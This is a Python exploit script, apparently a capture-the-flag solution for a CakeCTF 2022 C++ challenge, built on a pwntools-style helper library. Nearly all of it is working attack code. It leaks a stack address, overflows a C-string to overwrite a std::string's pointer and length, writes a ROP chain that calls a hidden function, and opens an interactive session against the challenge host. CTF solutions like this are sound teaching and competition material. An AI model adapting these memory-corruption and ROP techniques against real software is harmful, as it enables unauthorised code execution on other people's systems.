#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn1.2022.cakectf.com', 'port':9003})
env.select()

#==========

binf = ELF(bin_file)
addr_test_callme    = binf.sep_function['_ZN4Test7call_meEv']

#==========

def attack(conn, **kwargs):
    scs = StrCstr(conn)

    scs.set_str(b'\xff'*8)
    scs.set_cstr(b'a'*0x20)

    addr_stack = u(scs.get_str()[:8])
    if addr_stack >> 40 != 0x7f:
        raise
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    scs.set_cstr(b'hoge'.ljust(0x20, b'b') + p64(addr_stack) + p64(0x200))
    offset_test = scs.get_str().find(b'hoge')
    if offset_test < 0:
        raise

    addr_stack_test = addr_stack + offset_test
    info('addr_stack_test   = 0x{:08x}'.format(addr_stack_test))

    rop = ROP(binf)
    rop.call(rop.ret)
    rop.call(addr_test_callme)

    scs.set_cstr(b'c'*0x20 + p64(addr_stack_test + 0x68) + p64(0x8) + p64(0x30))
    scs.set_str(bytes(rop))

    scs.set_cstr(b'd'*0x20 + p64(addr_stack_test + 0x30) + p64(0x8))
    scs.exit()

class StrCstr:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def set_cstr(self, data):
        self.sendlineafter(b'choice: ', b'1')
        self.sendlineafter(b'c_str: ', data)

    def get_cstr(self):
        self.sendlineafter(b'choice: ', b'2')
        self.recvuntil(b'c_str: ')
        data = self.recvuntil(b'\nchoice: ', drop=True)
        self.unrecv(b'choice: ')
        return data

    def set_str(self, data):
        self.sendlineafter(b'choice: ', b'3')
        self.sendlineafter(b'str: ', data)

    def get_str(self):
        self.sendlineafter(b'choice: ', b'4')
        self.recvuntil(b'str: ')
        data = self.recvuntil(b'\nchoice: ', drop=True)
        self.unrecv(b'choice: ')
        return data

    def exit(self):
        self.sendlineafter(b'choice: ', b'0')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # CakeCTF{HW1: Remove "call_me" and solve it / HW2: Set PIE+RELRO and solve it}

if __name__=='__main__':
    main()

#==========
